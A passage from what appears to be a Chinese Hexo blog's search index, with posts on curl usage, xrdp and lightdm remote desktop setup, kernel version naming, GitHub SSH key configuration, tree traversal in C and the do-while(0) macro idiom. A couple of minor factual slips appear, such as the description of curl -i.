上传文件</span><br></pre></td></tr></table></figure><p><br></p><h5 id="断点续传"><a href="#断点续传" class="headerlink" title="断点续传"></a>断点续传</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1 # 当文件在下载完成之前结束该进程</span><br><span class="line">2 $ curl -O http://www.gnu.org/software/gettext/manual/gettext.html</span><br><span class="line">3 ##############             20.1%</span><br><span class="line">4 </span><br><span class="line">5 # 通过添加-C选项继续对该文件进行下载，已经下载过的文件不会被重新下载</span><br><span class="line">6 curl -C - -O http://www.gnu.org/software/gettext/manual/gettext.html</span><br><span class="line">7 ###############            21.1%</span><br></pre></td></tr></table></figure><p><br></p><h5 id="上传带Ftp服务器"><a href="#上传带Ftp服务器" class="headerlink" title="上传带Ftp服务器"></a>上传带Ftp服务器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 将myfile.txt文件上传到服务器</span><br><span class="line">curl -u ftpuser:ftppass -T myfile.txt ftp://ftp.testserver.com</span><br><span class="line"></span><br><span class="line"># 同时上传多个文件</span><br><span class="line">curl -u ftpuser:ftppass -T &quot;&#123;file1,file2&#125;&quot; ftp://ftp.testserver.com</span><br></pre></td></tr></table></figure><p><br></p><h5 id="I-i-区别"><a href="#I-i-区别" class="headerlink" title="I/i 区别"></a>I/i 区别</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">显示 HTTP request头信息</span><br><span class="line">curl -i www.baidu.com</span><br><span class="line"></span><br><span class="line">显示 HTTP response头信息</span><br><span class="line">curl -I www.baidu.com</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 命令 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>rdp_远程连接Linux</title>
      <link href="/2017/11/12/yunwei/rdp-%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5Linux/"/>
      <url>/2017/11/12/yunwei/rdp-%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5Linux/</url>
      
        <content type="html"><![CDATA[<p>一般情况下我们用ssh客户端远程登陆Linux系统，至于图形界面下的linux远程登陆工具，我们一般都会想到vnc，但它的安全性不够，</p><p>在这里，我将介绍XRDP的安装配置方法。我们可以很方便的通过windows远程桌面 linux。</p><h4 id="xrdp安装配置方法"><a href="#xrdp安装配置方法" class="headerlink" title="xrdp安装配置方法"></a>xrdp安装配置方法</h4><p>打开终端：依次安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install xrdp</span><br><span class="line"></span><br><span class="line">sudo apt-get install vnc4server tightvncserver</span><br></pre></td></tr></table></figure><a id="more"></a><p><br></p><h4 id="设置xrdp"><a href="#设置xrdp" class="headerlink" title="设置xrdp"></a>设置xrdp</h4><ol><li><p>gnome 界面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install gnome-shell</span><br><span class="line">$ sudo apt-get install ubuntu-gnome-desktop</span><br></pre></td></tr></table></figure><p>​</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;gnome-session --session=gnome-classic&quot; &gt; ~/.xsession   ##配置xdrp</span><br></pre></td></tr></table></figure><p>该命令的作用是由于安装了 gnome桌面，ubuntu12.04中同时存在unity、GNOME多个桌面管理器，需要启动的时候指定一个，不然即使远程登录验证成功以后，也只是背景。</p><p>xrdp的配置文档在/etc/xrdp目录下的xrdp.ini和sesman.in，一般选择默认。</p><p>​</p></li><li><p>xfce4图形界面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install xfce4</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;xfce4-session&quot; &gt; ~/.xsession   ##配置xdrp</span><br></pre></td></tr></table></figure></li></ol><p><br></p><h4 id="重启-xrdp"><a href="#重启-xrdp" class="headerlink" title="重启 xrdp"></a>重启 xrdp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/init.d/xrdp restart</span><br></pre></td></tr></table></figure><p><br></p><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><ol><li><p>Xrdp 链接出现  <code>no display in range is available</code></p><p>原因: 最大链接session达到限制值,  修改 /etc/xrdp/sesman.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sudo vi /etc/xrdp/sesman.ini</span><br><span class="line">MaxSessions=100</span><br></pre></td></tr></table></figure><p>​</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>xmanage-通过xdmcp远程连接Ubuntu</title>
      <link href="/2017/11/06/yunwei/xmanage-%E9%80%9A%E8%BF%87xdmcp%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5Ubuntu/"/>
      <url>/2017/11/06/yunwei/xmanage-%E9%80%9A%E8%BF%87xdmcp%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5Ubuntu/</url>
      
        <content type="html"><![CDATA[<p>XDMCP（X Display Manager Control Protocol）X显示监控协议。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install aptitude</span><br><span class="line">aptitude  install lightdm  ## 安装lightdm</span><br></pre></td></tr></table></figure><a id="more"></a><p><br \=""></p><h4 id="配置lightdm"><a href="#配置lightdm" class="headerlink" title="配置lightdm"></a>配置lightdm</h4><p>lightdm 配置文件存在于:  /usr/share/lightdm/lightdm.conf.d/50-ubuntu.conf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim /usr/share/lightdm/lightdm.conf.d/50-ubuntu.conf</span><br><span class="line">[SeatDefaults]</span><br><span class="line">user-session=mate     #将其改为mate, 并添加如下几行</span><br><span class="line">allow-guest=false</span><br><span class="line">greeter-show-manual-login=true</span><br><span class="line">greeter-hide-users=true</span><br><span class="line"> </span><br><span class="line">[XDMCPServer]</span><br><span class="line">enabled=true</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">$ sudo service lightdm restart  ## /etc/init.d/lightdm restart</span><br><span class="line"></span><br><span class="line">$ netstat -anp |grep 177   ## 是否启动成功</span><br><span class="line">udp        0      0 0.0.0.0:177             0.0.0.0:*                           -               </span><br><span class="line">udp6       0      0 :::177                  :::*</span><br></pre></td></tr></table></figure><ol><li><p>禁止访客登录</p><p>　  LightDM 默认允许你以临时访客登录，禁止该功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SeatDefaults]</span><br><span class="line">allow-guest=false</span><br></pre></td></tr></table></figure></li><li><p>隐藏用户列表</p><p>　　Unity Greeter（其他类似欢迎界面也一样）默认显示一个用户列表。如果你想禁用该功能，可以使用以下配置，以下配置也可以用以启动手动登录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SeatDefaults]</span><br><span class="line">greeter-hide-users=true</span><br></pre></td></tr></table></figure></li><li><p>允许手动登录</p><p>　　Unity Greeter 默认不允许你输入用户名来登录。你可以使用以下配置启用该特性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SeatDefaults]</span><br><span class="line">greeter-show-manual-login=true</span><br></pre></td></tr></table></figure></li></ol><ol><li><p>设置自动登录</p><p>　　设置 <strong>autologin-user</strong> 来设置系统启动时自动登录某个帐户。设置 <strong>autologin-user-timeout</strong> 限制用户在设定秒内如果没有自动登录则不能自动登录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SeatDefaults]</span><br><span class="line">autologin-user=username</span><br><span class="line">autologin-user-timeout=delay</span><br></pre></td></tr></table></figure></li></ol><ol><li><p>设置自动登录访客账号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">autologin-guest=true</span><br></pre></td></tr></table></figure></li></ol><ol><li><p>修改默认会话</p><p>　　默认会话设置保存在 <strong>/usr/share/lightdm/lightdm.conf.d/</strong> 会话包中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SeatDefaults]</span><br><span class="line">user-session=name</span><br></pre></td></tr></table></figure><p>　　其中 name 代表 <strong>/usr/share/xsessions/*.desktop</strong> 中 <name>.desktop。</name></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ls -ls /usr/share/xsessions</span><br><span class="line"></span><br><span class="line">4 -rw-r--r-- 1 root root  231 Mar 13  2014 gnome-classic.desktop</span><br><span class="line">4 -rw-r--r-- 1 root root  216 Mar 27  2015 gnome.desktop</span><br><span class="line">4 -rw-r--r-- 1 root root  272 Oct  1  2014 gnome-fallback-compiz.desktop</span><br><span class="line">4 -rw-r--r-- 1 root root  310 Oct  1  2014 gnome-fallback.desktop</span><br><span class="line">8 -rw-r--r-- 1 root root 6773 Mar 21  2015 mate.desktop</span><br><span class="line">4 -rw-r--r-- 1 root root  213 Mar 27  2015 ubuntu.desktop</span><br></pre></td></tr></table></figure><p>​</p><p>​</p></li></ol><h4 id="安装用户界面-xfce4-meta-gnome-可选"><a href="#安装用户界面-xfce4-meta-gnome-可选" class="headerlink" title="安装用户界面(xfce4, meta, gnome 可选):"></a>安装用户界面(xfce4, meta, gnome 可选):</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-add-repository ppa:ubuntu-mate-dev/ppa</span><br><span class="line">$ sudo apt-add-repository ppa:ubuntu-mate-dev/trusty-mate</span><br><span class="line">$ sudo apt-get update</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install mate-desktop-environment-core   #安装一个最小化的mate桌面</span><br><span class="line">$ sudo apt-get install mate-desktop-environment        #安装一个完整的mate桌面</span><br><span class="line">$ sudo apt-get install mate-desktop-environment-extras #安装一个完整的mate桌面(包含推荐的软件包)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install xfce4</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install gnome-shell</span><br><span class="line">$ sudo apt-get install ubuntu-gnome-desktop</span><br></pre></td></tr></table></figure><p><img src="/img/yunwei/xmanage.png" alt="配置"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Kernel-内核版本命令规则</title>
      <link href="/2017/11/01/kernel/Kernel-%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC%E5%91%BD%E4%BB%A4%E8%A7%84%E5%88%99/"/>
      <url>/2017/11/01/kernel/Kernel-%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC%E5%91%BD%E4%BB%A4%E8%A7%84%E5%88%99/</url>
      
        <content type="html"><![CDATA[<p><strong>Linux内核版本有两种：稳定版和开发版</strong> ，Linux内核版本号由3个数字组成：r.x.y</p><p>  r：目前发布的内核主版本。<br>  x：偶数表示稳定版本；奇数表示开发中版本。<br>  y：错误修补的次数。</p><a id="more"></a><p><br></p><p><strong>内核版本号每位都代表什么 ?</strong></p><p>​    以版本号为例： 2.6.9-5.ELsmp ,</p><p>​    r:   2 , 主版本号</p><p>​    x:  6 , 次版本号，表示稳定版本</p><p>​    y:  9 , 修订版本号 ， 表示修改的次数</p><p>头两个数字合在一齐可以描述内核系列。如稳定版的2.6.0，它是2.6版内核系列。</p><p>​    5:  表示这个当前版本的第5次微调patch ， 而ELsmp指出了当前内核是为ELsmp特别调校的</p><p>​    EL :   Enterprise Linux   ； smp : 表示支持多处理器 ， 表示该内核版本支持多处理器</p><p><strong>知识延伸 </strong>    一般的有三种:</p><ol><li>smp</li><li>bigmem</li><li>一般的内核</li></ol><p>​    </p><p>Red Hat Linux开机的时候，GRUB的启动菜单会有两个选项，分别是 </p><ul><li>Red Hat Enterprise Linux ES (版本号.ELsmp)</li><li>Red Hat Enterprise Linux ES-up (版本号.EL)</li></ul><p>　<strong>这两个分别是代表什么含义呢?</strong>　　其实这个就是系统开机时由GRUB引导启动 － 单处理器 与 对称多处理器启动核心文件的区别。</p><ul><li>Red Hat Enterprise Linux ES (版本号.ELsmp)  multiple processor (symmetric multiprocessing )</li><li>Red Hat Enterprise Linux ES-up (版本号.EL)   uniprocessor </li></ul><p><br></p><p><strong>下面就把SUSE与Red Hat启动菜单内可选择的选项，列举出来</strong>　</p><ol><li><p><strong>SUSE</strong>: </p><ul><li>版本号-default:  SUSE Linux kernel for uniprocessor machines  默认选项，支持单处理器机器</li><li>版本号-smp: SUSE Linux kernel that supports symmetric multiprocessing and up to 4 GB of RA 支持4GB内存的对称多处理器机器</li><li>版本号-bigsmp: SUSE Linux kernel supports symmetric multiprocessing and up to 64 GB     支持64GB内存的对称多处理器机器</li></ul></li><li><p><strong>Red Hat Linux</strong></p><ul><li>版本号.EL:   Red Hat Linux kernel for uniprocessor machines  支持单处理器机器</li><li>版本号.ELhugemem: Red Hat Linux kernel that supports up to 64 GB of RAM  支持64GB内存的对称多处理器机器</li><li>版本号.ELsmp: Red Hat Linux kernel that supports symmetric multiprocessing   对称多处理器机器，支持4G内存</li></ul></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Github SSh key以及多个rsa配置</title>
      <link href="/2017/10/28/software/Github-SSh-key%E4%BB%A5%E5%8F%8A%E5%A4%9A%E4%B8%AArsa%E9%85%8D%E7%BD%AE/"/>
      <url>/2017/10/28/software/Github-SSh-key%E4%BB%A5%E5%8F%8A%E5%A4%9A%E4%B8%AArsa%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<ul><li>生成SSH key</li><li>Github 添加公钥</li><li>ssh/config写法</li><li>config权限</li></ul><p><br><br><a id="more"></a></p><h4 id="生成SSH-Key"><a href="#生成SSH-Key" class="headerlink" title="生成SSH Key"></a>生成SSH Key</h4><p>在shell中键入以下命令:<code>ssh-keygen -t rsa -C &quot;your_email@example.com&quot;</code></p><p>将会提示输入存放秘钥的文件名。以及密码。</p><p>命令完成后会生成两个文件 id_rsa私钥和id_rsa.pub公钥，将其放置于 <code>~/.ssh/</code> 目录下。</p><p><br></p><h4 id="GitHub添加公钥"><a href="#GitHub添加公钥" class="headerlink" title="GitHub添加公钥"></a>GitHub添加公钥</h4><p>拷贝 id_rsa.pub 中内容，添加到github的ssh-key的配置中。</p><p><br></p><h4 id="多个rsa文件时"><a href="#多个rsa文件时" class="headerlink" title="多个rsa文件时"></a>多个rsa文件时</h4><p>在 <code>~/.ssh/</code> 编写config文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Host aaa.com</span><br><span class="line">    User git</span><br><span class="line">    HostName aaa.com</span><br><span class="line">    PreferredAuthentications publickey</span><br><span class="line">    IdentityFile  ~/.ssh/id_rsa.gitlab_postgres</span><br><span class="line">    </span><br><span class="line"><span class="meta">#</span> github</span><br><span class="line">Host github.com</span><br><span class="line">    HostName github.com</span><br><span class="line">    PreferredAuthentications publickey</span><br><span class="line">    IdentityFile ~/.ssh/github_rsa</span><br></pre></td></tr></table></figure><p><br></p><h4 id="config权限问题"><a href="#config权限问题" class="headerlink" title="config权限问题"></a>config权限问题</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Cloning into &apos;REL_10_HG_Rman&apos;...</span><br><span class="line">Bad owner or permissions on /home/Postgres/.ssh/config</span><br><span class="line">fatal: Could not read from remote repository.</span><br><span class="line"></span><br><span class="line">Please make sure you have the correct access rights</span><br><span class="line">and the repository exists.</span><br></pre></td></tr></table></figure><p>更改权限为:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod 0600 config</span><br></pre></td></tr></table></figure><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://gangzai.online/2018/03/13/commands/SSH-%E5%85%AC%E9%92%A5%E7%99%BB%E9%99%86%E6%9C%8D%E5%8A%A1%E5%99%A8/" target="_blank" rel="noopener">Linux-SSH公钥登陆服务器</a></p>]]></content>
      
      
      <categories>
          
          <category> Github </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>树的遍历</title>
      <link href="/2017/10/25/alogr/%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86/"/>
      <url>/2017/10/25/alogr/%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86/</url>
      
        <content type="html"><![CDATA[<p>树的遍历是图的遍历的一种，指按照某种规则，不重复地访问某种树的所有节点过程,  具体的访问操作可能是检查节点值，更新，插入，删除等， 不同的遍历方式其访问节点的顺序是不一样的。</p><a id="more"></a><p><br></p><h4 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h4><blockquote><ol><li><strong>节点的度</strong>：一个节点含有的子树的个数称为该节点的度；</li><li><strong>树的度</strong>：一棵树中，最大的节点的度称为树的度；</li><li><strong>叶节点</strong>或<strong>终端节点</strong>：度为零的节点；</li><li><strong>非终端节点</strong>或<strong>分支节点</strong>：度不为零的节点；</li><li><strong>父亲节点</strong>或<strong>父节点</strong>：若一个节点含有子节点，则这个节点称为其子节点的父节点；</li><li><strong>孩子节点</strong>或<strong>子节点</strong>：一个节点含有的子树的根节点称为该节点的子节点；</li><li><strong>兄弟节点</strong>：具有相同父节点的节点互称为兄弟节点；</li><li>节点的<strong>层次</strong>：从根开始定义起，根为第1层，根的子节点为第2层，以此类推；</li><li><strong>深度</strong>：对于任意节点n,n的深度为从根到n的唯一路径长，根的深度为0；</li><li><strong>高度</strong>：对于任意节点n,n的高度为从n到一片树叶的最长路径长，所有树叶的高度为0；</li><li><strong>堂兄弟节点</strong>：父节点在同一层的节点互为堂兄弟；</li><li><strong>节点的祖先</strong>：从根到该节点所经分支上的所有节点；</li><li><strong>子孙</strong>：以某节点为根的子树中任一节点都称为该节点的子孙。</li><li><strong>森林</strong>：由m（m&gt;=0）棵互不相交的树的集合称为森林；</li></ol></blockquote><p><br></p><h2 id="遍历种类"><a href="#遍历种类" class="headerlink" title="遍历种类"></a>遍历种类</h2><h6 id="先序遍历"><a href="#先序遍历" class="headerlink" title="先序遍历"></a>先序遍历</h6><p><strong>指先访问根，然后访问子树的遍历方式</strong></p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8a/%E5%89%8D%E5%BA%8F%E9%81%8D%E5%8E%86.png/220px-%E5%89%8D%E5%BA%8F%E9%81%8D%E5%8E%86.png" alt="img"></p><p>其C代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="function"><span class="keyword">void</span> <span class="title">pre_order_traversal</span><span class="params">(TreeNode *root)</span> </span>&#123;</span><br><span class="line"><span class="number">2</span>     <span class="comment">// Do Something with root</span></span><br><span class="line"><span class="number">3</span>     <span class="keyword">if</span> (root-&gt;lchild != <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">4</span>         pre_order_traversal(root-&gt;lchild);</span><br><span class="line"><span class="number">5</span>     <span class="keyword">if</span> (root-&gt;rchild != <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">6</span>         pre_order_traversal(root-&gt;rchild);</span><br><span class="line"><span class="number">7</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果:  1, 2, 4, 5, 7, 8, 3, 6</span></span><br></pre></td></tr></table></figure><p><br></p><h6 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h6><p><strong>指先访问左（右）子树，然后访问根，最后访问右（左）子树的遍历方式</strong> </p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c4/%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86.png/220px-%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86.png" alt="img"></p><p>其C代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="function"><span class="keyword">void</span> <span class="title">in_order_traversal</span><span class="params">(TreeNode *root)</span> </span>&#123;</span><br><span class="line"><span class="number">2</span>     <span class="keyword">if</span> (root-&gt;lchild != <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">3</span>         in_order_traversal(root-&gt;lchild);</span><br><span class="line"><span class="number">4</span>     <span class="comment">// Do Something with root</span></span><br><span class="line"><span class="number">5</span>     <span class="keyword">if</span> (root-&gt;rchild != <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">6</span>         in_order_traversal(root-&gt;rchild);</span><br><span class="line"><span class="number">7</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果: 4, 2, 7, 5, 8, 1, 3, 6</span></span><br></pre></td></tr></table></figure><p><br></p><h6 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h6><p><strong>指先访问子树，然后访问根的遍历方式</strong> </p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7f/%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86.png/220px-%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86.png" alt="img"></p><p>其C代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="function"><span class="keyword">void</span> <span class="title">post_order_traversal</span><span class="params">(TreeNode *root)</span> </span>&#123;</span><br><span class="line"><span class="number">2</span>     <span class="keyword">if</span> (root-&gt;lchild != <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">3</span>         post_order_traversal(root-&gt;lchild);</span><br><span class="line"><span class="number">4</span>     <span class="keyword">if</span> (root-&gt;rchild != <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">5</span>         post_order_traversal(root-&gt;rchild);</span><br><span class="line"><span class="number">6</span>     <span class="comment">// Do Something with root</span></span><br><span class="line"><span class="number">7</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果：4, 7, 8, 5, 2, 6, 3, 1</span></span><br></pre></td></tr></table></figure><p><br></p><h4 id="树的种类"><a href="#树的种类" class="headerlink" title="树的种类"></a>树的种类</h4><ul><li>无序树：树中任意节点的子节点之间没有顺序关系，这种树称为无序树，也称为<a href="https://zh.wikipedia.org/wiki/%E8%87%AA%E7%94%B1%E6%A0%91" target="_blank" rel="noopener">自由树</a>；</li><li>有序树：树中任意节点的子节点之间有顺序关系，这种树称为有序树；<ul><li>二叉树：每个节点最多含有两个子树的树称为二叉树；<ul><li>完全二叉树：对于一颗二叉树，假设其深度为d（d&gt;1）。除了第d层外，其它各层的节点数目均已达最大值，且第d层所有节点从左向右连续地紧密排列，这样的二叉树被称为完全二叉树；<ul><li><a href="https://zh.wikipedia.org/w/index.php?title=%E6%BB%A1%E4%BA%8C%E5%8F%89%E6%A0%91&amp;action=edit&amp;redlink=1" target="_blank" rel="noopener">满二叉树</a>：所有叶节点都在最底层的完全二叉树；</li></ul></li><li><a href="https://zh.wikipedia.org/wiki/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91" target="_blank" rel="noopener">平衡二叉树</a>（<a href="https://zh.wikipedia.org/wiki/AVL%E6%A0%91" target="_blank" rel="noopener">AVL树</a>）：当且仅当任何节点的两棵子树的高度差不大于1的二叉树；</li><li><a href="https://zh.wikipedia.org/w/index.php?title=%E6%8E%92%E5%BA%8F%E4%BA%8C%E5%8F%89%E6%A0%91&amp;action=edit&amp;redlink=1" target="_blank" rel="noopener">排序二叉树</a>(<a href="https://zh.wikipedia.org/wiki/%E4%BA%8C%E5%8F%89%E6%9F%A5%E6%89%BE%E6%A0%91" target="_blank" rel="noopener">二叉查找树</a>（英语：Binary Search Tree），也称二叉搜索树、有序二叉树)；</li></ul></li><li><a href="https://zh.wikipedia.org/wiki/%E9%9C%8D%E5%A4%AB%E6%9B%BC%E6%A0%91" target="_blank" rel="noopener">霍夫曼树</a>：<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B8%A6%E6%9D%83%E8%B7%AF%E5%BE%84&amp;action=edit&amp;redlink=1" target="_blank" rel="noopener">带权路径</a>最短的二叉树称为哈夫曼树或最优二叉树；</li><li><a href="https://zh.wikipedia.org/wiki/B%E6%A0%91" target="_blank" rel="noopener">B树</a>：一种对读写操作进行优化的自平衡的二叉查找树，能够保持数据有序，拥有多余两个子树。优化的自平衡的二叉查找树，能够保持数据有序，拥有多余两个子树。</li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux-c 宏定义中使用do_while(0)</title>
      <link href="/2017/10/19/cpluscplus/Linux-c-%E5%AE%8F%E5%AE%9A%E4%B9%89%E4%B8%AD%E4%BD%BF%E7%94%A8do-while-0/"/>
      <url>/2017/10/19/cpluscplus/Linux-c-%E5%AE%8F%E5%AE%9A%E4%B9%89%E4%B8%AD%E4%BD%BF%E7%94%A8do-while-0/</url>
      
        <content type="html"><![CDATA[<p>Linux 内核 c库中等很多开源代码中, 宏都是如下定义:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> update_zmalloc_stat_free(__n)    do &#123; \</span></span><br><span class="line"><span class="keyword">size_t</span> _n = (__n);  \ </span><br><span class="line"><span class="keyword">if</span>(_n&amp;(<span class="keyword">sizeof</span>(<span class="keyword">long</span>)<span class="number">-1</span>)) _n += <span class="keyword">sizeof</span>(<span class="keyword">long</span>)-(_n&amp;(<span class="keyword">sizeof</span>(<span class="keyword">long</span>)<span class="number">-1</span>)); \</span><br><span class="line">&#125; <span class="keyword">while</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><a id="more"></a><p><br></p><p>用途:</p><blockquote><p>​    do{…}while(0)在C中是唯一的构造程序，让你定义的宏总是以相同的方式工作，这样不管怎么使用宏（尤其在没有用大括号包围调用宏的语句），宏后面的分号也是相同的效果。</p></blockquote><p>总的意思， 是我们无论怎么使用宏， 都不会因为是否使用大括号等单行语句，导致语句的歧义; </p><p>例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span 